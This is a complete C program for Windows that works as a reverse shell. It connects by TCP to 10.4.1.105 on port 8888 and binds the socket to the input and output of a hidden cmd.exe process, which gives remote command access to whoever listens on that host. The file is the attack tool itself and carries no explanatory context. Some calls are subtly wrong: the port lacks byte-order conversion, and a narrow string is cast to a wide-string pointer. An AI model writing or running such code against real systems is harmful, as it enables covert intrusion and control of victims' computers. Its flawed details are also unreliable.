#include <WinSock2.h>
#include <stdio.h>
#include <Windows.h>

#pragma comment(lib, "Ws2_32")
#pragma warning(disable: 4996)

int main()
{
    const char* target_host = "10.4.1.105";
    int target_port = 8888;

    WSADATA wsaData;

    int WSAStartup_Check = WSAStartup(MAKEWORD(2, 2), &wsaData);

    if (WSAStartup_Check != 0)
    {
        printf("WSAStartup failed : %d\n", WSAStartup_Check);
        return 0;
    }

    struct sockaddr_in sock;

    SOCKET wsock = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, NULL, NULL); // Create Socket

    sock.sin_family = AF_INET;
    sock.sin_port = target_port;
    sock.sin_addr.s_addr = inet_addr(target_host);

    WSAConnect(wsock, (SOCKADDR*)&sock, sizeof(sock), NULL, NULL, NULL, NULL);      // Connect

    STARTUPINFO s_info;

    memset(&s_info, 0, sizeof(s_info));

    s_info.cb = sizeof(s_info);
    s_info.dwFlags = STARTF_USESTDHANDLES;
    s_info.hStdInput = (HANDLE)wsock;
    s_info.hStdOutput = (HANDLE)wsock;
    s_info.hStdError = (HANDLE)wsock;

    PROCESS_INFORMATION p_info;

    CreateProcessW(NULL, (LPWSTR)"cmd.exe", NULL, NULL, TRUE, CREATE_NO_WINDOW, NULL, NULL, &s_info, &p_info);

    return 0;
}
